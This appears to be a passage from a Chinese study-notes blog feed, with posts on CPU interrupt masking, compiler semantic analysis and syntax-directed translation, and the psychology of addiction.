href="#4-4-保护现场和恢复现场" class="headerlink" title="4.4 保护现场和恢复现场"></a>4.4 保护现场和恢复现场</h2><p><strong>保护现场</strong>应该包括<strong>保护程序断点</strong>和<strong>保护CPU内部寄存器内容的现场</strong>两个方面。</p><p><strong>恢复现场</strong>是指在中断返回前，必须将寄存器的内容恢复到中断处理前的状态，这部分工作也由<strong>中断服务程序</strong>完成。</p><h2 id="4-5-中断屏蔽技术"><a href="#4-5-中断屏蔽技术" class="headerlink" title="4.5 中断屏蔽技术"></a>4.5 中断屏蔽技术</h2><h3 id="4-5-1-多重中断"><a href="#4-5-1-多重中断" class="headerlink" title="4.5.1 多重中断"></a>4.5.1 多重中断</h3><p>CPU正在执行某个中断服务程序时，另一个中断源又提出了新的中断请求，而CPU又响应了这个新的请求，暂时停止正在运行的服务程序，这称为<strong>多重中断</strong>。</p><p>实现多重中断的条件：</p><ol><li>提前设置“开中断”指令</li><li>优先级别高的中断源有权中断优先级别低的中断源</li></ol><h3 id="4-5-2-屏蔽技术"><a href="#4-5-2-屏蔽技术" class="headerlink" title="4.5.2 屏蔽技术"></a>4.5.2 屏蔽技术</h3><h4 id="4-5-2-1-屏蔽触发器与屏蔽字"><a href="#4-5-2-1-屏蔽触发器与屏蔽字" class="headerlink" title="4.5.2.1 屏蔽触发器与屏蔽字"></a>4.5.2.1 屏蔽触发器与屏蔽字</h4><p>当该中断源被屏蔽时（$MASK&#x3D;1$），此时即使$D&#x3D;1$，中断查询信号到来时刻只能将$INTR&#x3D;0$，CPU接收不到该中断源的中断请求，即它被屏蔽。</p><p>如果排队器集中设在CPU内，加上屏蔽条件，就可组成具有屏蔽功能的排队器，如下图所示：</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_jIGREIzzRM.png"></p><p>显然，对应每个中断请求触发器就有一个屏蔽触发器，将所有的屏蔽触发器组合在一起，便构成一个屏蔽寄存器，屏蔽寄存器的内容称为<strong>屏蔽字</strong>。下图是16个中断源的优先级按照降序排序：</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_hE6w7cf49b.png"></p><p>在中断服务程序中设置适当的屏蔽字，能起到对优先级别不同的中断源的屏蔽作用。</p><h4 id="4-5-2-2-屏蔽技术可改变优先等级"><a href="#4-5-2-2-屏蔽技术可改变优先等级" class="headerlink" title="4.5.2.2 屏蔽技术可改变优先等级"></a>4.5.2.2 屏蔽技术可改变优先等级</h4><p>优先级包含响应优先级和处理优先级。响应优先级是指CPU响应各中断源请求的优先次序，这种次序往往是<strong>硬件线路</strong>已设置好的，不便于改动。处理优先级是指CPU实际对各中断源请求的处理优先次序。</p><p>如果不采用屏蔽技术，响应的优先次序就是处理的优先次序。采用了屏蔽技术之后，可以改变各中断源的优先等级，从而改变CPU执行程序的轨迹。</p><blockquote><p>CPU 执行程序轨迹（原屏蔽字）</p></blockquote><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_yqCd8VJtE8.png"></p><blockquote><p>CPU 执行程序轨迹（新屏蔽字）</p></blockquote><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_FfnYxEtLex.png"></p><p>在不改变CPU响应中断的次序下，通过改变屏蔽字可以改变CPU处理中断的次序。</p><h3 id="4-5-3-多重中断的断点保护"><a href="#4-5-3-多重中断的断点保护" class="headerlink" title="4.5.3 多重中断的断点保护"></a>4.5.3 多重中断的断点保护</h3><p>中断系统对断点的保存都是在中断周期内由<strong>中断隐指令</strong>实现的，对用户是<strong>透明</strong>的。断点可以保存在堆栈内，也可保存在特定的存储单元内。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理第8章：语义分析和中间代码生成</title>
      <link href="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/"/>
      <url>/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_oy-v9hCdN4.png"></p><h1 id="1-声明语句的翻译"><a href="#1-声明语句的翻译" class="headerlink" title="1 声明语句的翻译"></a>1 声明语句的翻译</h1><p><strong>主要任务</strong>：分析所声明$id$的性质、类型和地址，在符号表中为$id$建立一条记录。</p><h2 id="1-1-类型表达式"><a href="#1-1-类型表达式" class="headerlink" title="1.1 类型表达式"></a>1.1 类型表达式</h2><p>设有C程序片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stype</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">8</span>];</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line">stype table[<span class="number">50</span>];</span><br><span class="line">stype* p;</span><br></pre></td></tr></table></figure><p>和<code>stype</code>绑定的类型表达式：<code>record((name × array(8, char)) × (score × integer))</code></p><p>和<code>table</code>绑定的类型表达式：<code>array(50, stype)</code></p><p>和<code>p</code>绑定的类型表达式：<code>pointer(stype)</code></p><h2 id="1-2-局部变量的存储分配"><a href="#1-2-局部变量的存储分配" class="headerlink" title="1.2 局部变量的存储分配"></a>1.2 局部变量的存储分配</h2><p>对于声明语句，语义分析的主要任务就是<strong>收集标识符的类型</strong>等属性信息，并为每一个名字分配一个<strong>相对地址</strong>。</p><ul><li>从类型表达式可以知道该类型在运行时刻所需的存储单元数量称为<strong>类型的宽度</strong>$(width)$</li><li>在<strong>编译时刻</strong>，可以使用类型的宽度为每一个名字分配一个<strong>相对地址</strong></li></ul><p>名字的类型和相对地址信息保存在相应的符号表记录中。</p><hr><h1 id="2-赋值语句翻译"><a href="#2-赋值语句翻译" class="headerlink" title="2 赋值语句翻译"></a>2 赋值语句翻译</h1><p>赋值语句的基本文法：</p><ol><li>$S \rightarrow \mathrm{id}&#x3D;E$</li><li>$E \rightarrow E_1+E_2$</li><li>$E\rightarrow E_1 * E_2$</li><li>$E \rightarrow-E_{1}$</li><li>$E \rightarrow\left(E_{1}\right)$</li><li>$E \rightarrow id$</li></ol><p>赋值语句翻译的主要任务：生成对表达式求值的三地址码</p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image__vZdnjXIc1.png"></p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_KO5XTTTz-P.png"></p><h2 id="2-1-含有数组引用的赋值语句的翻译"><a href="#2-1-含有数组引用的赋值语句的翻译" class="headerlink" title="2.1 含有数组引用的赋值语句的翻译"></a>2.1 含有数组引用的赋值语句的翻译</h2><p>将数组引用翻译成三地址码时要解决的主要问题是确定数组元素的存放地址，也就是数组元素的寻址。</p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_XraXEzFpTv.png"></p><hr><h1 id="3-控制流语句的翻译"><a href="#3-控制流语句的翻译" class="headerlink" title="3 控制流语句的翻译"></a>3 控制流语句的翻译</h1><p>在跳转代码中，逻辑运算符&amp;&amp;、|| 和 ! 被翻译成跳转指令。运算符本身不出现在代码中，布尔表达式的值是通过代码序列中的位置来表示的。</p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_A_jVt3vDHU.png"></p><h2 id="3-1-布尔表达式的SDT"><a href="#3-1-布尔表达式的SDT" class="headerlink" title="3.1 布尔表达式的SDT"></a>3.1 布尔表达式的SDT</h2><p>$$<br>\begin{array}{l}B \rightarrow E_{1} \text { relop } E_{2}{\text { gen(‘if’ } E_{1} \text { addr relop } E_{2} \text {.addr ‘goto’ B.true }) ;  \text { gen(‘goto’ B.false); }}\end{array}<br>$$</p><p>$$<br>B \rightarrow \operatorname{true}\{ gen(&#39;goto’ B.true); \}<br>$$</p><p>$$<br>{B} \rightarrow false \{ gen(&#39;goto’ B.false ) ;\}<br>$$</p><p>$$<br>{B} \rightarrow(\{B_{1}.true &#x3D; B. true ; B_{1}.false &#x3D; B.false;\} {B}_{1})<br>$$</p><p>$$<br>{B} \rightarrow {not}\{B_{1}.true &#x3D; B. false; B_{1}. false &#x3D; B.true;\} {B}_{1}<br>$$</p><h3 id="3-1-1-B-rightarrow-B-1-or-B-2"><a href="#3-1-1-B-rightarrow-B-1-or-B-2" class="headerlink" title="$3.1.1  B \rightarrow B_{1} or B_{2}$"></a>$3.1.1  B \rightarrow B_{1} or B_{2}$</h3><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_lZol__TZxh.png"></p><h3 id="3-1-2-B-rightarrow-B-1-and-B-2"><a href="#3-1-2-B-rightarrow-B-1-and-B-2" class="headerlink" title="$3.1.2  B \rightarrow B_{1} and B_{2}$"></a>$3.1.2  B \rightarrow B_{1} and B_{2}$</h3><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_tqKs9DEHy_.png"></p><h2 id="3-2-控制流语句的代码结构"><a href="#3-2-控制流语句的代码结构" class="headerlink" title="3.2 控制流语句的代码结构"></a>3.2 控制流语句的代码结构</h2><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_iRW-CORI_G.png"></p><h2 id="3-3-控制流语句SDT编写要点"><a href="#3-3-控制流语句SDT编写要点" class="headerlink" title="3.3 控制流语句SDT编写要点"></a>3.3 控制流语句SDT编写要点</h2><p>分析每一个非终结符之前：</p><ol><li>先计算继承属性</li><li>再观察代码结构图中该非终结符对应的方框顶部是否有导入箭头。如果有，调用label( )函数</li></ol><p>上一个代码框执行完不顺序执行下一个代码框时，生成一条显式跳转指令。</p><p>有自下而上的箭头时，设置begin属性。且定义后直接调用label( )函数绑定地址。</p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_eew0EutSRD.png"></p><p>控制流语句翻译的一个关键是确定跳转指令的目标标号，存在问题：生成跳转指令时，目标标号还不能确定。</p><p><strong>解决办法</strong>：生成一些临时变量用来存放标号，将临时变量的地址作为继承属性传递到标号可以确定的地方。也就是说，当目标标号的值确定下来以后再赋给相应的变量。</p><p><strong>缺点</strong>：需要进行两遍处理</p><ol><li>第一遍生成临时的指令</li><li>第二遍将指令中的临时变量的地址改为具体的标号，从而得到最终的三地址指令</li></ol><hr><h1 id="4-语义分析中的错误检测"><a href="#4-语义分析中的错误检测" class="headerlink" title="4 语义分析中的错误检测"></a>4 语义分析中的错误检测</h1><p><strong>错误1</strong>：变量或过程未经声明就使用 （赋值&#x2F;过程调用语句翻译）</p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_ipKii7BzSr.png"></p><p><strong>错误2</strong>：变量或过程名重复声明（声明语句翻译）</p><p>$$<br>{D} \rightarrow {T} {i d} ;\{ enter( id.lexeme, T.type, offset ) ; offset &#x3D; offset + T.width ;\} {D}<br>$$</p><p><strong>错误3</strong>：运算分量类型不匹配（赋值语句翻译）</p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_rrxJvJo8im.png"></p><p><strong>错误4</strong>：操作符与操作数之间的类型不匹配</p><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_2NJFGVJ4JW.png"></p><h2 id="4-1-基本语句的语法制导翻译过程"><a href="#4-1-基本语句的语法制导翻译过程" class="headerlink" title="4.1 基本语句的语法制导翻译过程"></a>4.1 基本语句的语法制导翻译过程</h2><p><img src="/2024/08/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/image_ff295lthaO.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>心理学：成瘾机制</title>
      <link href="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-柯立芝效应"><a href="#1-柯立芝效应" class="headerlink" title="1 柯立芝效应"></a>1 柯立芝效应</h1><p>研究发现，大多数哺乳动物在交媾之后的一段时间内，即使原有的配偶就在身边，也不再有性行为，这个阶段称为<strong>性不应期</strong>。但是，如果在雄性动物交媾之后，重新给它一个<strong>新的雌性</strong>发情对象，它的不应期会大大缩短，甚至立即又出现交媾行为。</p><p>这种动物对新异性所显示的效应，在心理学上就被叫做<strong>柯立芝效应</strong>。</p><p>对同一件事我们会很快就习惯了，并逐渐变得麻木。我把它提炼成一个思维模型，叫做<strong>习惯麻木</strong>。同时，我们又在不断的追求新鲜感，追求新的刺激。我把它提炼成一个思维模型，叫做<strong>追求新鲜</strong>。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_gi9JLuHArU.png"></p><p>对于同一件事情，我们每重复一次，阈值就会提高一点，需要更高的刺激才能达到跟原来一样的感觉。</p><hr><h1 id="2-成瘾机制"><a href="#2-成瘾机制" class="headerlink" title="2 成瘾机制"></a>2 成瘾机制</h1><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_9BqDqptSpO.png"></p><p>对于人类和其他哺乳类动物来讲，欲望和动机都来自一种叫做多巴胺的神经化合物。多巴胺让人脑中的奖赏机制活跃起来，让人类产生快感，它也是人们上瘾的原因，所以被称为<strong>成瘾分子</strong>。</p><p>但是多巴胺并不是一个坏东西，多巴胺可以促使你做一切有利于你的基因延续的事情，</p><p>新的事物可以刺激多巴胺，这也是为什么网络上的一些内容会刺激奖赏机制。因为鼠标一点，新的画面就出现了，随着多个同时打开的页面和无数的浏览，当一个大脑面对着它从未进化到可以处理超量的刺激的时候，那种感觉就像是在大脑里放烟花一样，不上瘾才怪。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_9p76gQF_ZJ.png"></p><h2 id="2-1-敏化反应"><a href="#2-1-敏化反应" class="headerlink" title="2.1 敏化反应"></a>2.1 敏化反应</h2><p>多巴胺刺激导致DeltaFosB生产过剩，和神经细胞之间的联系加强，练习越多就越容易做，最后变成无意识的思想和习惯。</p><h2 id="2-2-脱敏反应"><a href="#2-2-脱敏反应" class="headerlink" title="2.2 脱敏反应"></a>2.2 脱敏反应</h2><p>多巴胺不断泵出的时候，接收细胞就会发生紊乱，减少多巴胺受体的释放。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_WxooXFbaSL.png"></p><h2 id="2-3-脑前额叶功能退化"><a href="#2-3-脑前额叶功能退化" class="headerlink" title="2.3 脑前额叶功能退化"></a>2.3 脑前额叶功能退化</h2><p>脑前额叶灰质和白质的改变，使成瘾者控制冲动和预知后果能力降低。在放纵和自责之间来回拉扯，更严重的可能会做出一些不好的事情。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_e1jGVl9xox.png"></p><h2 id="2-4-压力失常"><a href="#2-4-压力失常" class="headerlink" title="2.4 压力失常"></a>2.4 压力失常</h2><p>戒瘾本来就会带来压力，而压力容易导致成瘾者破戒，形成一个死循环。很多人把压力当作放纵自己的借口，其实不是借口，是真的。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_BHMx5VhVSW.png"></p><hr><h1 id="3-哪些东西容易成瘾？"><a href="#3-哪些东西容易成瘾？" class="headerlink" title="3 哪些东西容易成瘾？"></a>3 哪些东西容易成瘾？</h1><p>神经学专家提出了一个4C模型，符合这个模型的过程其实都可以叫做成瘾。</p><ol><li>compulsion（强迫）</li><li>continue（持续）</li><li>control（无法控制）</li><li>craving（渴望，心理或生理上的依赖）</li></ol><p>生活中有许多可能会让人成瘾的内容需要注意，比如垃圾食品、游戏、短视频和烟酒等等。而且这些更有潜力让人上瘾，因为你做这些事儿没人会管你。只要条件允许，你可以随时随地获取。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_EQX6oXQmBp.png"></p><p>游戏和短视频的问题可能会越来越严重，因为设计这些App的技术团队已经不只是研究产品，而是开始研究受众的心理。他们会揣摩用户什么时候会受刺激，什么时候会产生满足感。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_7YgN8onFAB.png"></p><hr><h1 id="4-怎样才能成功戒瘾？"><a href="#4-怎样才能成功戒瘾？" class="headerlink" title="4 怎样才能成功戒瘾？"></a>4 怎样才能成功戒瘾？</h1><p>从神经学角度来看，成瘾是因为DeltaFosB与神经细胞之间的联系加强，久而久之，在大脑中形成一条敏化的路，走这条路很爽。戒瘾就需要我们重启大脑，用其他路取代这条成瘾的路。</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_RNK7m2J1RW.png"></p><p>什么东西可以刺激多巴胺让其他路产生敏化反应呢？</p><ol><li>希望</li><li>挑战</li><li>奖赏</li></ol><h2 id="4-1-希望"><a href="#4-1-希望" class="headerlink" title="4.1 希望"></a>4.1 希望</h2><p>在心里有压力的时候，只要心里有明确的目标和希望，就会刺激多巴胺的分泌，也就是创造幸福感和动力。所以希望是戒瘾的前提，除了可以直接刺激多巴胺的分泌外，也会产生一种稀缺状态，精力、意识和时间都投入到自己的目标中。</p><h2 id="4-2-挑战"><a href="#4-2-挑战" class="headerlink" title="4.2 挑战"></a>4.2 挑战</h2><p>游戏能让你上瘾的原因之一就是因为难度越来越高，挑战之后的满足感也越来越强烈。我们只是在用经验、习惯和潜在认值在处理简单的事情，这也是我们觉得生活没有乐趣的原因之一。</p><p>当我们把游戏心态应用到生活当中，你会发现生活就像打怪升级一样，挑战自己原定一个小时完成的工作，在40分钟内完成。</p><h2 id="4-3-奖赏"><a href="#4-3-奖赏" class="headerlink" title="4.3 奖赏"></a>4.3 奖赏</h2><h3 id="4-3-1-克服时间贴现"><a href="#4-3-1-克服时间贴现" class="headerlink" title="4.3.1 克服时间贴现"></a>4.3.1 克服时间贴现</h3><p>想象目标完成之后的收获，这会欺骗你的大脑，它会误认为你已经成功了，并且分泌多巴胺。</p><h3 id="4-3-2-发现容易忽视的奖赏"><a href="#4-3-2-发现容易忽视的奖赏" class="headerlink" title="4.3.2 发现容易忽视的奖赏"></a>4.3.2 发现容易忽视的奖赏</h3><p>比如减肥，体重秤上数字的减少就是奖赏，看书不经意间悟出的道理就是奖赏。你关注的点不同，就会有不同的感受，这也是为什么有些人积极乐观，有些人郁郁寡欢。</p><hr><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><p>戒瘾难吗？戒瘾很难，但刚好也是一种挑战，而且很多人已经通过不同的方法挑战成功，不再被成瘾物挟持，恢复了正常的生活</p><p><img src="/2024/08/29/%E5%BF%83%E7%90%86%E5%AD%A6%EF%BC%9A%E6%88%90%E7%98%BE%E6%9C%BA%E5%88%B6/image_48jEe5P87-.png"></p><p>所以，只要你想，你也可以！</p>]]></content>
      
      
      <categories>
          
          <category> 心理学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成瘾机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理第7章：语法制导翻译</title>
      <link href="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/"/>
      <url>/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h1 id="第7章-语法制导翻译"><a href="#第7章-语法制导翻译" class="headerlink" title="第7章 语法制导翻译"></a>第7章 语法制导翻译</h1><h1 id="1-语法制导翻译概述"><a href="#1-语法制导翻译概述" class="headerlink" title="1 语法制导翻译概述"></a>1 语法制导翻译概述</h1><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_4440YxJNyd.png"></p><p><strong>如何表示语义信息</strong>：为CFG中的文法符号设置语义属性，用来表示语法成分对应的语义信息。</p><p><strong>如何计算语义属性</strong>：</p><ol><li>文法符号的语义属性值是用与文法符号所在产生式（语法规则）相关联的语义规则来计算的</li><li>对于给定的输入串$x$ ，构建$x$的语法分析树，并利用与产生式（语法规则）相关联的语义规则来计算分析树中各结点对应的语义属性值</li></ol><h2 id="1-1-语法制导定义-SDD"><a href="#1-1-语法制导定义-SDD" class="headerlink" title="1.1 语法制导定义(SDD)"></a>1.1 语法制导定义(SDD)</h2><p>SDD是对CFG的推广，将每个文法符号和一个语义属性集合相关联，将每个产生式和一组语义规则相关联，这些规则用于计算该产生式中各文法符号的属性值。</p><p>如果$X$是一个文法符号，$a$是$X$的一个属性，则用$X.a$表示属性$a$在某个标号为$X$的分析树结点上的值。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_izRs4O9qNj.png"></p><h2 id="1-2-语法制导翻译方案-SDT"><a href="#1-2-语法制导翻译方案-SDT" class="headerlink" title="1.2 语法制导翻译方案(SDT)"></a>1.2 语法制导翻译方案(SDT)</h2><p>SDT是在产生式右部嵌入了程序片段的CFG，这些程序片段称为语义动作。按照惯例，语义动作放在花括号内。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_4bw67QXTGd.png"></p><p>一个语义动作在产生式中的位置决定了这个动作的执行时间。</p><h2 id="1-3-SDD与SDT"><a href="#1-3-SDD与SDT" class="headerlink" title="1.3 SDD与SDT"></a>1.3 SDD与SDT</h2><p>SDD是关于语言翻译的高层次规格说明，隐蔽了许多具体实现细节，使用户不必显式地说明翻译发生的顺序。</p><p>SDT可以看作是对SDD的一种补充，是SDD的具体实施方案。显式地指明了语义规则的计算顺序，以便说明某些实现细节。</p><hr><h1 id="2-语法制导定义SDD"><a href="#2-语法制导定义SDD" class="headerlink" title="2 语法制导定义SDD"></a>2 语法制导定义SDD</h1><p>文法符号的属性：</p><ol><li>综合属性 (synthesized attribute)</li><li>继承属性 (inherited attribute)</li></ol><h2 id="2-1-综合属性"><a href="#2-1-综合属性" class="headerlink" title="2.1 综合属性"></a>2.1 综合属性</h2><p>在分析树结点 N上的<strong>非终结符A的综合属性</strong>只能通过** N的子结点**或 <strong>N本身</strong>的属性值来定义。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_DCSSoWqXF7.png"></p><p>终结符可以具有综合属性。<strong>终结符的综合属性值是由词法分析器提供的词法值</strong>，因此在SDD中没有计算终结符属性值的语义规则。</p><h2 id="2-2-继承属性"><a href="#2-2-继承属性" class="headerlink" title="2.2 继承属性"></a>2.2 继承属性</h2><p>在分析树结点 N上的非终结符A的<strong>继承属性</strong>只能通过<strong>N的父结点</strong>、<strong>N的兄弟结点</strong>或 <strong>N本身</strong>的属性值来定义。</p><p><img 